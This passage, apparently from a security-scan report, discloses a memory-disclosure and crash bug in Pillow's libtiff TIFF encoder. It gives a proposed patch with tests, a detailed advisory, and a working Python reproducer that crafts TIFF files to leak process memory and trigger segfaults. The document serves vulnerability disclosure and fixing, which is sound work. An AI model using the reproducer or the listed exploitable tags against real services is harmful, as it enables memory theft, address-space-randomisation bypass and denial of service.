branch, which never passed a count (and extends it to\n  `TIFF_SRATIONAL`);\n* `TIFF_UNDEFINED` fields are registered as variable-length, matching how their\n  `bytes` values are passed;\n* `Tests/test_file_libtiff.py` gains a regression test (scalar DNGPrivateData,\n  scalar and 2-tuple ActiveArea rejected; well-formed values round-trip).\n\nCore tags and tags libtiff does not know keep their current behaviour. With the\npatch applied to a clean checkout and rebuilt, the reproducer no longer\ntriggers and the test suite passes. It is not a complete fix, however: the\nwhole check sits inside `if (!is_core_tag)`, so the BYTE-typed ColorMap variant\nstays open. The PackBits RGB TIFF carrying `320 / BYTE / 4`, re-saved with a\nbare `save()`, no longer segfaults at this point but writes 1536 bytes —\nover-read from the 5-byte `bytes` object and two stale varargs, including 22\nlive heap pointers — into the output ColorMap, which is still a disclosure.\nBefore merging, it needs a guard that accepts `TIFFTAG_COLORMAP` only through\nthe existing 768-tuple branch, never through the scalar or `bytes` branches,\nand ideally the same shape check for the other core tags libtiff special-cases\nin `_TIFFVSetField` (YCbCrSubsampling 530, TransferFunction 301,\nReferenceBlackWhite 532).\n\nNarrower Python-side mitigations in `_save` close individual entry points but\nnot the class, and are worth adding alongside the C-side check: drop tags\nwith `TiffTags.lookup(tag).type is None` from `supplied_tags` (closes the `Image.open()→save()` path shown here but not\n`tiffinfo=` callers); remove `COLORMAP` from `supplied_tags` next to\n`EXIFIFD`/`SAMPLEFORMAT` and extend the `IPTC_NAA_CHUNK` BYTE/UNDEFINED type\nguard to `PHOTOSHOP_CHUNK` and `XMP`; add 318/319/529 to the blocklist next to\n`REFERENCEBLACKWHITE`; and have `_save` `ifd.tagtype.pop(tag, None)` before\nassigning its own ColorMap/BitsPerSample/ICCProfile/… values so a\n`tiffinfo=`-imported type cannot reshape them. The C-side check is the fix to\nrely on.\n\n## The patch\n\nPass TIFF tag values to libtiff according to its own field definition, and raise ValueError when they do not fit\n\nApplies to `src/encode.c` at the commit above. It passed the mechanical check — applied to a clean tree, rebuilt, the reproducer stopped firing — but a reviewer did not endorse it as the right fix.\n\n```diff\ndiff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py\nindex 3d804ea4a..adc4633e4 100644\n--- a/Tests/test_file_libtiff.py\n+++ b/Tests/test_file_libtiff.py\n@@ -395,6 +395,43 @@ class TestFileLibTiff(LibTiffTestCase):\n         with pytest.raises(ValueError, match=\"Incorrect tag value type\"):\n             im.save(out, tiffinfo=ifd)\n \n+    @pytest.mark.parametrize(\n+        \"tag, value\",\n+        (\n+            # DNGPrivateData is a BYTE array with a count to libtiff\n+            (50740, 4096),\n+            # ActiveArea is a LONG array of four values to libtiff\n+            (50829, 64),\n+            (50829, (0, 0)),\n+        ),\n+    )\n+    def test_libtiff_field_definition(\n+        self, tag: int, value: Any, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n+    ) -\u003e None:\n+        monkeypatch.setattr(TiffImagePlugin, \"WRITE_LIBTIFF\", True)\n+\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[tag] = value\n+        ifd.tagtype[tag] = TiffTags.LONG\n+\n+        out = tmp_path / \"temp.tif\"\n+        im = Image.new(\"L\", (1, 1))\n+        with pytest.raises(ValueError, match=\"libtiff field definition\"):\n+            im.save(out, tiffinfo=ifd)\n+\n+        # Values that match the libtiff definition are written\n+        ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+        ifd[50740] = b\"private\"\n+        ifd.tagtype[50740] = TiffTags.BYTE\n+        ifd[50829] = (0, 0, 1, 1)\n+        ifd.tagtype[50829] = TiffTags.LONG\n+        im.save(out, tiffinfo=ifd)\n+\n+        with Image.open(out) as reloaded:\n+            assert isinstance(reloaded, TiffImagePlugin.TiffImageFile)\n+            assert reloaded.tag_v2[50740] == b\"private\"\n+            assert reloaded.tag_v2[50829] == (0, 0, 1, 1)\n+\n     def test_inknames_tag(\n         self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path\n     ) -\u003e None:\ndiff --git a/src/encode.c b/src/encode.c\nindex 9e19e9002..cbbd09f0d 100644\n--- a/src/encode.c\n+++ b/src/encode.c\n@@ -675,6 +675,106 @@ PyImaging_ZipEncoderNew(PyObject *self, PyObject *args) {\n \n #include \u003cstring.h\u003e\n \n+/* C type that TIFFSetField reads from its arguments for a single value of\n+   the given type: int, uint64_t, double or char * */\n+static int\n+tiff_scalar_arg_type(TIFFDataType type) {\n+    switch (type) {\n+        case TIFF_BYTE:\n+        case TIFF_SBYTE:\n+        case TIFF_UNDEFINED:\n+        case TIFF_SHORT:\n+        case TIFF_SSHORT:\n+        case TIFF_LONG:\n+        case TIFF_SLONG:\n+        case TIFF_IFD:\n+            return 1;\n+        case TIFF_LONG8:\n+        case TIFF_SLONG8:\n+        case TIFF_IFD8:\n+            return 2;\n+        case TIFF_FLOAT:\n+        case TIFF_DOUBLE:\n+        case TIFF_RATIONAL:\n+        case TIFF_SRATIONAL:\n+            return 3;\n+        case TIFF_ASCII:\n+            return 4;\n+        default:\n+            return 0;\n+    }\n+}\n+\n+/* Size of the values that TIFFSetField copies from an array of the given\n+   type. libtiff stores custom RATIONAL arrays as floats. */\n+static int\n+tiff_array_item_size(TIFFDataType type) {\n+    switch (type) {\n+        case TIFF_BYTE:\n+        case TIFF_SBYTE:\n+        case TIFF_UNDEFINED:\n+        case TIFF_ASCII:\n+            return 1;\n+        case TIFF_SHORT:\n+        case TIFF_SSHORT:\n+            return 2;\n+        case TIFF_LONG:\n+        case TIFF_SLONG:\n+        case TIFF_IFD:\n+        case TIFF_FLOAT:\n+        case TIFF_RATIONAL:\n+        case TIFF_SRATIONAL:\n+            return 4;\n+        case TIFF_DOUBLE:\n+        case TIFF_LONG8:\n+        case TIFF_SLONG8:\n+        case TIFF_IFD8:\n+            return 8;\n+        default:\n+            return 0;\n+    }\n+}\n+\n+/* Check that a value which will be passed to TIFFSetField as a single value\n+   of the given type, or as an array of len values, matches the definition\n+   of the field that libtiff will use. */\n+static int\n+tiff_field_matches(\n+    TIFFDataType field_type,\n+    int passcount,\n+    int writecount,\n+    TIFFDataType type,\n+    int is_var_length,\n+    Py_ssize_t len\n+) {\n+    if (field_type == TIFF_ASCII \u0026\u0026 !passcount) {\n+        // TIFFSetField reads a null-terminated string\n+        return !is_var_length \u0026\u0026 type == TIFF_ASCII;\n+    }\n+    if (!is_var_length) {\n+        // TIFFSetField reads a single value\n+        return !passcount \u0026\u0026 writecount == 1 \u0026\u0026 tiff_scalar_arg_type(type) \u0026\u0026\n+               tiff_scalar_arg_type(type) == tiff_scalar_arg_type(field_type);\n+    }\n+    // TIFFSetField reads a pointer to the values, preceded by the number of\n+    // values if passcount is set. Otherwise, the number of values is fixed.\n+    if (!tiff_array_item_size(type) ||\n+        tiff_array_item_size(type) != tiff_array_item_size(field_type)) {\n+        return 0;\n+    }\n+    return passcount || (writecount \u003e 1 \u0026\u0026 len == writecount);\n+}\n+\n+static int\n+set_tiff_array_field(\n+    ImagingCodecState state, int key, int passcount, Py_ssize_t len, void *av\n+) {\n+    if (passcount) {\n+        return ImagingLibTiffSetField(state, (ttag_t)key, len, av);\n+    }\n+    return ImagingLibTiffSetField(state, (ttag_t)key, av);\n+}\n+\n PyObject *\n PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n     ImagingEncoderObject *encoder;\n@@ -689,7 +789,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n     PyObject *key, *value;\n     Py_ssize_t pos = 0;\n     int key_int, status, is_core_tag, is_var_length, num_core_tags, i;\n-    TIFFDataType type = TIFF_NOTYPE;\n+    int is_known_tag, passcount, writecount;\n+    TIFFDataType type = TIFF_NOTYPE, field_type;\n     // This list also exists in TiffTags.py\n     const int core_tags[] = {256, 257, 258,   259,   262,   263,   266,  269, 274, 277,\n                              278, 280, 281,   282,   283,   284,   286,  287, 296, 297,\n@@ -777,6 +878,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n         status = 0;\n         is_core_tag = 0;\n         is_var_length = 0;\n+        is_known_tag = 0;\n+        passcount = 1;\n         type = TIFF_NOTYPE;\n \n         for (i = 0; i \u003c num_core_tags; i++) {\n@@ -800,6 +903,15 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 }\n                 Py_DECREF(tag_type);\n             }\n+\n+            // libtiff uses its own definition for tags that it already knows,\n+            // rather than the field registered below.\n+            is_known_tag = ImagingLibTiffFindField(\n+                \u0026encoder-\u003estate, key_int, \u0026field_type, \u0026passcount, \u0026writecount\n+            );\n+            if (is_known_tag \u0026\u0026 type == TIFF_NOTYPE) {\n+                type = field_type;\n+            }\n         }\n \n         if (type == TIFF_NOTYPE) {\n@@ -838,7 +950,7 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n \n         if (!is_core_tag) {\n             // Register field for non core tags.\n-            if (type == TIFF_BYTE) {\n+            if (type == TIFF_BYTE || type == TIFF_UNDEFINED) {\n                 is_var_length = 1;\n             }\n             if (ImagingLibTiffMergeFieldInfo(\n@@ -847,6 +959,28 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 Py_DECREF(item);\n                 continue;\n             }\n+\n+            if (is_known_tag) {\n+                // Check that the value will be passed to TIFFSetField in the\n+                // form that libtiff's definition of the tag expects.\n+                Py_ssize_t len = 0;\n+                if (PyTuple_Check(value)) {\n+                    len = PyTuple_Size(value);\n+                } else if (PyBytes_Check(value)) {\n+                    len = PyBytes_Size(value);\n+                }\n+                if (!tiff_field_matches(\n+                        field_type, passcount, writecount, type, is_var_length, len\n+                    )) {\n+                    Py_DECREF(encoder);\n+                    Py_DECREF(item);\n+                    PyErr_SetString(\n+                        PyExc_ValueError,\n+                        \"Tag value does not match libtiff field definition\"\n+                    );\n+                    return NULL;\n+                }\n+            }\n         }\n \n         if (type == TIFF_BYTE || type == TIFF_UNDEFINED ||\n@@ -857,9 +991,10 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                 PyErr_SetString(PyExc_ValueError, \"Incorrect tag value type\");\n                 return NULL;\n             }\n-            status = ImagingLibTiffSetField(\n+            status = set_tiff_array_field(\n                 \u0026encoder-\u003estate,\n-                (ttag_t)key_int,\n+                key_int,\n+                passcount,\n                 PyBytes_Size(value),\n                 PyBytes_AsString(value)\n             );\n@@ -909,8 +1044,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (UINT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -922,8 +1057,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (UINT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -935,8 +1070,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT8)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -948,8 +1083,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT16)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -961,8 +1096,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (INT32)PyLong_AsLong(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -974,8 +1109,8 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n@@ -987,12 +1122,12 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status = ImagingLibTiffSetField(\n-                        \u0026encoder-\u003estate, (ttag_t)key_int, len, av\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n                     );\n                     free(av);\n                 }\n-            } else if (type == TIFF_RATIONAL) {\n+            } else if (type == TIFF_RATIONAL || type == TIFF_SRATIONAL) {\n                 FLOAT32 *av;\n                 /* malloc check ok, calloc checks for overflow */\n                 av = calloc(len, sizeof(FLOAT32));\n@@ -1000,8 +1135,9 @@ PyImaging_LibTiffEncoderNew(PyObject *self, PyObject *args) {\n                     for (i = 0; i \u003c len; i++) {\n                         av[i] = (FLOAT32)PyFloat_AsDouble(PyTuple_GetItem(value, i));\n                     }\n-                    status =\n-                        ImagingLibTiffSetField(\u0026encoder-\u003estate, (ttag_t)key_int, av);\n+                    status = set_tiff_array_field(\n+                        \u0026encoder-\u003estate, key_int, passcount, len, av\n+                    );\n                     free(av);\n                 }\n             }\ndiff --git a/src/libImaging/TiffDecode.c b/src/libImaging/TiffDecode.c\nindex 8a57c523d..e14dd50bb 100644\n--- a/src/libImaging/TiffDecode.c\n+++ b/src/libImaging/TiffDecode.c\n@@ -923,6 +923,29 @@ ImagingLibTiffMergeFieldInfo(\n     return TIFFMergeFieldInfo(clientstate-\u003etiff, info, n);\n }\n \n+int\n+ImagingLibTiffFindField(\n+    ImagingCodecState state,\n+    int key,\n+    TIFFDataType *field_type,\n+    int *passcount,\n+    int *writecount\n+) {\n+    // Look up libtiff's own definition of a tag. TIFFMergeFieldInfo does not\n+    // replace the definition of a tag that libtiff already knows, so this is\n+    // what TIFFSetField will use for such tags.\n+    TIFFSTATE *clientstate = (TIFFSTATE *)state-\u003econtext;\n+    const TIFFField *fip = TIFFFindField(clientstate-\u003etiff, (ttag_t)key, TIFF_ANY);\n+\n+    if (!fip) {\n+        return 0;\n+    }\n+    *field_type = TIFFFieldDataType(fip);\n+    *passcount = TIFFFieldPassCount(fip);\n+    *writecount = TIFFFieldWriteCount(fip);\n+    return 1;\n+}\n+\n int\n ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...) {\n     // after tif_dir.c-\u003eTIFFSetField.\ndiff --git a/src/libImaging/TiffDecode.h b/src/libImaging/TiffDecode.h\nindex c31d0b9d8..ee1e4a5f9 100644\n--- a/src/libImaging/TiffDecode.h\n+++ b/src/libImaging/TiffDecode.h\n@@ -41,6 +41,14 @@ ImagingLibTiffMergeFieldInfo(\n     ImagingCodecState state, TIFFDataType field_type, int key, int is_var_length\n );\n extern int\n+ImagingLibTiffFindField(\n+    ImagingCodecState state,\n+    int key,\n+    TIFFDataType *field_type,\n+    int *passcount,\n+    int *writecount\n+);\n+extern int\n ImagingLibTiffSetField(ImagingCodecState state, ttag_t tag, ...);\n \n /*\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,545 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# Pillow libtiff writer: a count-1 integer tag copied from the source TIFF is passed to\n# TIFFSetField() as one scalar vararg; for tags libtiff itself defines as arrays it is\n# consumed as a byte COUNT (DNGPrivateData 50740 -\u003e N bytes of process memory written\n# into the output) or as a POINTER (ActiveArea 50829 -\u003e SIGSEGV).  Application side is\n# the ordinary \"open upload, save as TIFF\" (compression is inherited -\u003e libtiff writer).\nimport io, struct, subprocess, sys, resource\nfrom PIL import Image\n\ndef upload(tag, value):\n    \"\"\"Pillow-written 16x16 LZW TIFF, plus one extra IFD entry \u003ctag\u003e LONG[1] = value.\"\"\"\n    b = io.BytesIO()\n    Image.new(\"RGB\", (16, 16), \"red\").save(b, \"TIFF\", compression=\"tiff_lzw\")\n    data = bytearray(b.getvalue()); assert data[:4] == b\"II*\\0\"\n    (off,) = struct.unpack_from(\"\u003cI\", data, 4)\n    (n,) = struct.unpack_from(\"\u003cH\", data, off)\n    ents = [bytes(data[off + 2 + 12 * i: off + 14 + 12 * i]) for i in range(n)]\n    ents.append(struct.pack(\"\u003cHHII\", tag, 4, 1, value))\n    ents.sort(key=lambda e: struct.unpack_from(\"\u003cH\", e)[0])\n    data += b\"\\0\" * (len(data) \u0026 1); new_off = len(data)\n    data += struct.pack(\"\u003cH\", len(ents)) + b\"\".join(ents) + struct.pack(\"\u003cI\", 0)\n    struct.pack_into(\"\u003cI\", data, 4, new_off)\n    return bytes(data)\n\ndef resave(src):                       # the whole \"service\"\n    im = Image.open(io.BytesIO(src)); out = io.BytesIO(); im.save(out, \"TIFF\")\n    return out.getvalue()\n\nif len(sys.argv) \u003e 1 and sys.argv[1] == \"child\":\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resave(upload(50829, 64)); sys.exit(0)\n\nprint(\"PIL core:\", Image.core.__file__)\nctl = Image.open(io.BytesIO(resave(upload(65000, 4096)))).tag_v2.get(65000)\nprint(\"control  tag 65000=4096 -\u003e\", repr(ctl))\n\nN = 65536\nsrc = upload(50740, N)\ntry:\n    v = Image.open(io.BytesIO(resave(src))).tag_v2.get(50740)\nexcept (ValueError, RuntimeError) as e:   # a fixed Pillow may reject the tag\n    v = e\nleak = isinstance(v, bytes) and len(v) == N and v[:64] not in src\nprint(f\"leak     tag 50740={N} from a {len(src)}-byte upload -\u003e\",\n      f\"{len(v)} bytes not present in input, head {v[:32].hex()}\" if leak else repr(v)[:80])\nif leak:\n    so = open(Image.core.__file__, \"rb\").read()\n    print(\"         leaked bytes found in _imaging.so at file offset\", hex(so.find(v[:256])))\n\nrc = subprocess.call([sys.executable, __file__, \"child\"])\ncrash = rc in (-11, 139)\nprint(\"crash    tag 50829=64 -\u003e child exit\", rc, \"(SIGSEGV)\" if crash else \"\")\nprint(\"BUG\" if leak or crash else \"OK\")\n```\n\u003c/details\u003e\n\n---"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112902](https://osv.dev/CVE-2026-112902)**.\n\n## [GHSA-xvh5-g6gv-559v](https://osv.dev/GHSA-xvh5-g6gv-559v)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ```\n\u003e ============================================================================\n\u003e Memory disclosure and segfault in libtiff encoder via crafted TIFF tags\n\u003e Location: src/encode.c:1014  in PyImaging_LibTiffEncoderNew()\n\u003e Commit:   a707c6b21c313880d0771e54965d142dd42358b6\n\u003e ============================================================================\n\u003e ```\n\u003e \n\u003e A crafted TIFF file of a few hundred bytes makes Pillow copy an attacker-chosen amount of its own process memory into the TIFF it writes back out, or crash the process outright. The trigger is an ordinary `Image.open()` followed by a bare `im.save(fp, \"TIFF\")`. The only precondition is that the application re-saves images as TIFF. When the uploaded file is compressed, Pillow routes that save through libtiff automatically, with no options from the application. The attached reproducer does this with a 356-byte LZW TIFF: one crafted tag comes back holding 65536 bytes taken from `_imaging.so`'s read-only data, and a second crafted tag makes the worker die with SIGSEGV on every run.\n\u003e \n\u003e The bug is in `PyImaging_LibTiffEncoderNew` (`src/encode.c`). It decides what arguments to pass to the variadic `TIFFSetField()` from the shape of the Python value (scalar, tuple or bytes). It assumes its `ImagingLibTiffMergeFieldInfo()` call defined how libtiff will read them. But `TIFFMergeFieldInfo()` never overrides libtiff's built-in field table, so libtiff reads the arguments according to its own definition of the tag:\n\u003e \n\u003e - For a counted array tag such as DNGPrivateData (50740), a count-1 integer in the source file is taken as the byte count. The data pointer is then read from an argument slot Pillow never wrote, and that many bytes are copied into the output.\n\u003e - For a fixed-size array tag such as ActiveArea (50829), the integer itself is used as the source address.\n\u003e \n\u003e Where that unwritten slot points depends on the compiler. In the tested clang build it points into `_imaging.so`, and a larger count returned thousands of pointers into libpython, libc and libtiff, which defeats address-space randomisation for anyone chaining another bug. When the application preserves metadata with `tiffinfo=im.tag_v2`, a 64-bit entry turns ActiveArea into a 16-byte read from an address the attacker chooses. All observed memory errors are reads; no out-of-bounds write was found.\n\u003e \n\u003e Other branches of the same loop share the defect and are reachable from crafted TIFFs or from EXIF in JPEG/PNG/WebP re-saved as compressed TIFF. These are the `bytes`, RATIONAL-tuple and typed-tuple branches, and a BYTE-typed ColorMap. The file-reachable forwarding was introduced in `a3d45e9cefd0` (\"Added custom int and float TIFF tags\") and first released in 5.4.0.\n\u003e \n\u003e ## Details\n\u003e \n\u003e `PyImaging_LibTiffEncoderNew` (`src/encode.c:777-1060`) chooses the argument\n\u003e list it hands to the variadic `TIFFSetField()` from the *Python* value of each\n\u003e tag — scalar vs. tuple vs. `bytes`, and a type that is either autodetected or\n\u003e copied from the source file's IFD — and assumes that its own\n\u003e `ImagingLibTiffMergeFieldInfo()` registration defines how libtiff will read the\n\u003e `va_list`. It does not: libtiff keeps its built-in definition for every tag it\n\u003e already knows, and core tags are never registered at all. libtiff therefore\n\u003e consumes the varargs as `(count, pointer)`, `(pointer)` or three pointers\n\u003e according to *its* field table, whatever Pillow actually pushed. The encoder\n\u003e never consults that table (`TIFFFindField` / `TIFFFieldPassCount` /\n\u003e `TIFFFieldWriteCount` / `TIFFFieldDataType`) before the call.\n\u003e \n\u003e The most severe instance, and the one the attached reproducer exercises: when a\n\u003e TIFF is re-saved through the libtiff writer, every tag of the source IFD that\n\u003e Pillow does not recognise is forwarded to libtiff with `TIFFSetField()`. A\n\u003e count-1 integer entry is passed as a single scalar vararg. If libtiff's own\n\u003e field table defines that tag number as an *array* field, libtiff consumes the\n\u003e varargs as `(count, pointer)` or `(pointer)` instead, so the attacker's integer\n\u003e becomes either the number of bytes to copy from a never-written vararg slot, or\n\u003e the source address itself. The same mismatch is reachable through the typed\n\u003e tuple branches (tuple length consumed as a pointer for fixed-count built-in\n\u003e tags such as `CFARepeatPatternDim`, even when the source file is well-formed),\n\u003e the `bytes`, `TIFF_RATIONAL`-tuple and core-tag branches of the same loop;\n\u003e those are listed\n\u003e under *Other branches with the same defect* below and need to be covered by the\n\u003e same fix.\n\u003e \n\u003e A 181-byte TIFF (16×16 RGB, one LZW strip, plus one extra IFD entry\n\u003e `50740 / LONG / count 1 / value 4096` — DNGPrivateData) opened with\n\u003e `Image.open()` and saved with a bare `im.save(buf, \"TIFF\")` produces a 4296-byte\n\u003e output whose tag 50740 holds 4096 bytes that occur nowhere in the input; scanning\n\u003e `/proc/self/mem` finds them in the read-only data segment of `_imaging.so`.\n\u003e Changing the extra entry to `50829 / LONG / 1 / 64` (ActiveArea) makes the same\n\u003e two calls segfault in `memcpy(dst, src=0x40, n=16)` under\n\u003e `ImagingLibTiffSetField` ← `PyImaging_LibTiffEncoderNew`. An ASan build of the\n\u003e extensions reports `READ of size 4096` in `memcpy` called from\n\u003e `src/encode.c:1014` for the first input.\n\u003e \n\u003e ### Code path\n\u003e \n\u003e `_save` copies all tags of the opened image into the libtiff attribute list.\n\u003e For a tag that is neither in `LIBTIFF_CORE` nor in `TiffTags.TAGS_V2`, no type\n\u003e is recorded, so the value goes through untyped:\n\u003e \n\u003e ```python\n\u003e # src/PIL/TiffImagePlugin.py:1782\n\u003e supplied_tags = {**legacy_ifd, **getattr(im, \"tag_v2\", {})}\n\u003e …\n\u003e # :1959-1982\n\u003e for tag, value in itertools.chain(ifd.items(), supplied_tags.items()):\n\u003e     if tag not in TiffTags.LIBTIFF_CORE:\n\u003e         …\n\u003e         elif isinstance(value, (int, float, str, bytes)) or …:\n\u003e             type = TiffTags.lookup(tag).type      # None for 50740, 50829, …\n\u003e             if type:\n\u003e                 types[tag] = type\n\u003e     if tag not in atts and tag not in blocklist:\n\u003e         …\n\u003e             atts[tag] = value                     # plain int 4096\n\u003e ```\n\u003e \n\u003e `compression` defaults to the source image's `im.info[\"compression\"]`\n\u003e (`TiffImagePlugin.py:1731-1746`), so a compressed source selects the libtiff\n\u003e writer without the application asking for it.\n\u003e \n\u003e In the encoder the untyped `int` is autodetected as `TIFF_LONG`\n\u003e (`src/encode.c:805-815`), the tag is \"registered\" as a scalar custom field, and\n\u003e then set with one 32-bit vararg:\n\u003e \n\u003e ```c\n\u003e // src/encode.c:844      (is_var_length = 0 → writecount 1, passcount 0)\n\u003e if (ImagingLibTiffMergeFieldInfo(\u0026encoder-\u003estate, type, key_int, is_var_length)) {\n\u003e     … continue;\n\u003e }\n\u003e …\n\u003e // src/encode.c:1013-1016\n\u003e } else if (type == TIFF_LONG || type == TIFF_IFD) {\n\u003e     status = ImagingLibTiffSetField(\n\u003e         \u0026encoder-\u003estate, (ttag_t)key_int, (UINT32)PyLong_AsLong(value)\n\u003e     );\n\u003e ```\n\u003e \n\u003e The registration does not do what the caller assumes. `TIFFMergeFieldInfo()`\n\u003e only adds definitions for tags libtiff does not already know and returns 0\n\u003e (success) either way, so for tags in libtiff's built-in table the built-in\n\u003e definition stays in force. Queried against the linked libtiff 4.5.0 after\n\u003e exactly Pillow's merge call:\n\u003e \n\u003e ```\n\u003e 50740 DNGPrivateData      type=BYTE   passcount=1 writecount=-1   (unchanged)\n\u003e 50829 ActiveArea          type=LONG   passcount=0 writecount=4    (unchanged)\n\u003e 65000 CustomField         type=LONG   passcount=0 writecount=1    (Pillow's definition, tag was unknown)\n\u003e ```\n\u003e \n\u003e libtiff's setter for `FIELD_CUSTOM` tags then interprets the `va_list`\n\u003e according to *its* definition: for `passcount=1` it reads `va_arg(ap, int)` as\n\u003e the element count — the attacker's 4096 — allocates `count * size` bytes and\n\u003e `memcpy`s that many bytes from `va_arg(ap, void *)`, a slot\n\u003e `PyImaging_LibTiffEncoderNew` never wrote. On x86-64 that slot is register\n\u003e `rcx`; in this build it holds a pointer into `_imaging.so`'s `.rodata`, so the\n\u003e copy succeeds deterministically (a value of 2 000 000 also succeeds and yields a\n\u003e 2 000 200-byte output). `TIFFWriteDirectory` writes the copied bytes into the\n\u003e output file as the tag's value. For fixed-count array fields (`passcount=0`,\n\u003e `writecount=4` for ActiveArea) there is no count argument, so the attacker's\n\u003e scalar is consumed as the `void *` source and 16 bytes are read from address\n\u003e 64 → SIGSEGV.\n\u003e \n\u003e Tags in libtiff 4.5's built-in table that Pillow forwards untyped and that take\n\u003e the `(count, pointer)` form include DNGPrivateData 50740, CFAPattern 33422,\n\u003e CFAPlaneColor 50710, LinearizationTable 50712, BlackLevel 50714, WhiteLevel\n\u003e 50717, ColorMatrix1/2 50721/50722, AsShotNeutral 50728, OriginalRawFileName/Data\n\u003e 50827/50828, AsShotICCProfile 50831, CurrentICCProfile 50833. Fixed-count ones\n\u003e (pointer only → crash) include ActiveArea 50829, DNGVersion/DNGBackwardVersion\n\u003e 50706/50707, DefaultScale/DefaultCropOrigin/DefaultCropSize 50718–50720,\n\u003e AsShotWhiteXY 50729, CFARepeatPatternDim 33421, BlackLevelRepeatDim 50713,\n\u003e ImageLayer 34732, RawDataUniqueID 50781.\n\u003e \n\u003e When the application saves with `tiffinfo=im.tag_v2` (the documented way to\n\u003e preserve metadata), the file-declared type is honoured, and a `LONG8` entry\n\u003e reaches the `(uint64_t)PyLong_AsLongLong(value)` branch at\n\u003e `src/encode.c:1049-1052`. For ActiveArea that is a 16-byte read from a full\n\u003e 64-bit attacker-chosen address into the output: a source entry\n\u003e `50829 / LONG8 / 1 / \u003caddress of a Python bytes object\u003e` produced an output\n\u003e ActiveArea of `(b'SECR', b'ET-T', b'OKEN', b'-012')` in testing.\n\u003e \n\u003e The comment above `blocklist +=` at `TiffImagePlugin.py:1938-1944` already notes\n\u003e that array tags with the wrong length \"will result in segfaults\"; the blocklist\n\u003e covers only a handful of tags Pillow itself knows, not the ones libtiff knows and\n\u003e Pillow does not. Forwarding of these tags was introduced in `a3d45e9cefd0`\n\u003e (\"Added custom int and float TIFF tags\", 2018-10-25), first released in 5.4.0;\n\u003e releases 2.0.0–3.0.0 forwarded them as scalars too, until `9fa6634f4`\n\u003e (\"Partial fix for #1597\") limited `_save` to `LIBTIFF_CORE`.\n\u003e \n\u003e ### Other branches with the same defect\n\u003e \n\u003e The scalar-integer branch above is one of several places in the same loop\n\u003e where the call shape is derived from the Python value rather than from\n\u003e libtiff's definition. All of the following were confirmed on this commit (stock\n\u003e build crashes and/or ASan reports, stack always `memcpy ← libtiff ←\n\u003e ImagingLibTiffSetField src/libImaging/TiffDecode.c:934 ←\n\u003e 